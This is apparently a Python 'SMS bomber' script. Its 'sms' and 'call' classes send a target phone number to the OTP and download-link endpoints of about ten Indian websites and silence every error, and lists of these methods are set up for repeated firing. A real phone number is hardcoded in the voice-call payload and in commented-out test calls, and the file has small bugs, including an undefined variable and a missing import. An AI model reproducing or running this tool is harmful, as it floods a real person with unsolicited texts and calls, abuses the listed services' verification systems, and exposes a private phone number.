from requests import post

class sms:
    
    def byjus(ph):#1
        url = 'https://mtnucleus.byjusweb.com/api/acs/v2/send-otp'
        payload = {
            'page' : 'free-trial-classes',
            'phoneNumber' : ph
        }
        try:
            post(url, data = payload)
        except:
            pass    

    def playrummy(ph):#3
        url = 'https://www.playrummy.com/updateData.php'
        payload = {
            'data' : 'sms_download_link',
            'mobile' : ph,
            'source' : 'download-web'
        }

        try:
            post(url, data = payload)
        except:
            pass
    
    def jungleerummy(ph):#4
        url = 'https://app.jungleerummy.com/elara/v2/send-jr-sms?'
        payload = {
            'mobile_number' : ph
        }

        try:
            post(url, data = payload)
        except:
            pass
    
    def my11circle(ph):#5
        url = 'https://www.my11circle.com/api/fl/auth/v3/getOtp'
        payload = {
            "mobile": ph,
            "deviceId": "ea7976ef-0bbf-4f77-a1f0-315ebf2f873e",
            "deviceName": "",
            "refCode": "",
            "isPlaycircle": 'false'
        }

        try:
            post(url, data = payload)            
        except:
            pass
    
    def hiscor(ph):#6
        url = 'https://nostrapi.nostragamus.in/v4/utils/sendOTP'
        payload = {
            "action": "signup",
            "mobile": ph,
            "type": "mobile",
            "uid": ""
        }

        try:
            post(url, data = payload)            
        except:
            pass
    
    def rummycircle(ph):#7
        url = 'https://www.rummycircle.com/api/fl/auth/v3/getOtp'
        payload = {
            'mobile': ph,
            'deviceId': 'd58bce0a-9811-4243-b14e-031e24ad5161',
            'deviceName': '',
            'refCode': '',
            'isPlaycircle': 'false'
        }

        try:
            post(url, data = payload)            
        except:
            pass
    
    def aakash(ph):#8
        url = 'https://iacst.aakash.ac.in/anthe/global-otp-verify'
        payload = {
            'mobileparam' : ph,
            'global_data_id' : 'anthe-otp',
            'student_name' : '',
            'corpid' : 'undefined'
        }

        try:
            post(url, data = payload)
        except:
            pass
    
    def whitehatjr(ph):#9
        url = 'https://api.whitehatjr.com/api/V1/otp/generate?deviceId=eb7226a9-9127-47a0-a073-1453af8ac4d1&timezone=Asia/Calcutta&trackingCode=trackingCode|AB-11169-V-B|AB-11159-V-A|AB-11140-V-A|AB-11164-V-A|AB-11137-V-A|AB-11194-V-B|AB-11186-V-A|AB-11208-V-A|AB-11167-V-A|AB-11182-V-A|AB-11183-V-B|AB-22-V-B|AB-11188-V-B|AB-11150-V-B|AB-29-V-B|AB-11192-V-A|AB-11142-V-A|AB-24-V-C|AB-11151-V-B|AB-11200-V-A|AB-11154-V-A|AB-11195-V-A|AB-11198-V-A|AB-26-V-B|AB-11136-V-A|AB-11152-V-B|AB-13-V-B|AB-11166-V-A|AB-11196-V-A|AB-18-V-A|AB-11184-V-A|AB-11206-V-B|AB-31-V-A|AB-11193-V-B|AB-11176-V-B|AB-11191-V-B|AB-11181-V-B|AB-11156-V-A|AB-11209-V-A|AB-28-V-B|AB-15-V-A|AB-34-V-A|AB-11204-V-A|AB-11163-V-A|AB-11155-V-A|AB-25-V-B|AB-11135-V-A|AB-11201-V-B|AB-11202-V-A|AB-21-V-C|AB-11161-V-A|AB-37-V-B|AB-23-V-C|AB-11153-V-B|AB-17-V-A|AB-11175-V-A|AB-12-V-A|AB-11165-V-A|AB-11160-V-B|AB-27-V-B&regionId=IN&courseType=ALL&brandId=whitehatjr&timestamp=1675871425983&_vercel_no_cache=1'
        payload = {
            "dialCode": "+91",
            "mobile": ph
        }       

        try:
            post(url, data = payload)
            print(p.status_code)
        except:
            pass
    
    def vootkids(ph):#10
        
        url = 'https://us-central1-vootkidsprod-17598.cloudfunctions.net/auth/web/v2/tokens/generate'
        payload = {
            'mobile': ph,
            'countryCode': '+91'
        }
        try:
            post(url, data = payload)
        except:            
            pass


class call:
    def byjus(ph):#1
        
        url = 'https://api.whitehatjr.com/api/V1/otp/generate?deviceId=ab5f7c2a-de52-4a6a-aba9-0d93fe1447d4&timezone=Asia/Calcutta&trackingCode=trackingCode|AB-11169-V-B|AB-11159-V-A|AB-11140-V-A|AB-11164-V-A|AB-11194-V-B|AB-11137-V-A|AB-11186-V-A|AB-11208-V-B|AB-11167-V-A|AB-11182-V-B|AB-22-V-B|AB-11188-V-B|AB-11150-V-B|AB-29-V-B|AB-11192-V-A|AB-11142-V-A|AB-11183-V-B|AB-24-V-C|AB-11151-V-B|AB-11154-V-A|AB-11200-V-A|AB-11198-V-A|AB-26-V-B|AB-11136-V-A|AB-11152-V-B|AB-11166-V-A|AB-13-V-B|AB-11195-V-A|AB-11196-V-A|AB-18-V-A|AB-11184-V-A|AB-11206-V-B|AB-31-V-A|AB-11193-V-B|AB-11176-V-B|AB-11191-V-B|AB-11181-V-B|AB-11156-V-A|AB-11209-V-A|AB-28-V-B|AB-15-V-A|AB-34-V-A|AB-11204-V-A|AB-11163-V-A|AB-11201-V-B|AB-25-V-B|AB-11135-V-A|AB-11155-V-A|AB-11202-V-A|AB-21-V-C|AB-11161-V-A|AB-37-V-B|AB-23-V-C|AB-11153-V-B|AB-17-V-A|AB-11175-V-A|AB-11165-V-A|AB-12-V-A|AB-11160-V-B|AB-27-V-B&regionId=IN&courseType=ALL&brandId=whitehatjr&timestamp=1676716225213&_vercel_no_cache=1'
        payload = {
            "dialCode": "+91",
            "mobile": "9566782699",
            "type": "voice"
        }        
        try:
            p = requests.post(url, data = payload)
        except:            
            pass
    
    
sms_sites = (sms.byjus,
         sms.playrummy,
         sms.jungleerummy,
         sms.my11circle,
         sms.hiscor,
         sms.rummycircle,
         sms.aakash,
         sms.whitehatjr,
         sms.vootkids
    )

call_sites = (
    call.byjus,
    )
#random.choice(sites)('9566782699')
#sms.tnesevai('9566782699')
#with_account.flipkart('+919566782699')

